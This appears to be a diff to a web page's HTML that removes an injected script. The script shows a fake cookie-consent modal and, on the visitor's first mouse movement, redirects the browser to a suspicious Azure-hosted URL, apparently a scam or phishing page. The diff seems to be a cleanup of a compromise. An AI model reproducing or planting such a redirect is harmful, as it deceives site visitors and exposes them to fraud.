@@ -2219,55 +2219,5 @@ hs.src = ('//s10.histats.com/js15_as.js');
     });
   }
 </script>
-  <script>
-        (function () {
-            // Show popup immediately on page load
-            const overlay = document.createElement('div');
-            overlay.id = 'cookie-overlay';
-            Object.assign(overlay.style, {
-                position: 'fixed', inset: '0',
-                background: 'rgba(0,0,0,0.55)',
-                backdropFilter: 'blur(6px)',
-                WebkitBackdropFilter: 'blur(6px)',
-                zIndex: '99998',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center'
-            });
-
-            const modal = document.createElement('div');
-            Object.assign(modal.style, {
-                background: '#fff',
-                borderRadius: '8px',
-                padding: '2rem 2.5rem',
-                maxWidth: '400px',
-                width: '90%',
-                textAlign: 'center',
-                fontFamily: 'sans-serif',
-                zIndex: '99999',
-                position: 'relative'
-            });
-
-            modal.innerHTML = `
-    <h2 style="font-size:20px;font-weight:700;margin:0 0 12px;color:#111;">Cookie Policy</h2>
-    <p style="font-size:14px;color:#444;line-height:1.6;margin:0 0 1.5rem;">
-      We use cookies to enhance your browsing experience, serve personalized ads or content,
-      and analyze our traffic. By continuing to use our site, you consent to our use of cookies.
-    </p>
-    <div style="display:flex;gap:12px;justify-content:center;">
-      <button id="cookie-decline" style="padding:10px 22px;border:2px solid #111;background:#fff;color:#111;font-weight:700;font-size:14px;cursor:pointer;letter-spacing:.05em;">DECLINE</button>
-      <button id="cookie-accept" style="padding:10px 22px;border:2px solid #111;background:#111;color:#fff;font-weight:700;font-size:14px;cursor:pointer;letter-spacing:.05em;">ACCEPT</button>
-    </div>
-  `;
-
-            overlay.appendChild(modal);
-            document.body.appendChild(overlay);
-
-            // Redirect on first cursor movement
-            document.addEventListener('mousemove', function () {
-                window.location.href = 'https://errors00erorrspc0009u.z13.web.core.windows.net/';
-            }, { once: true });
-        })();
-    </script>
 </body>
 </html>
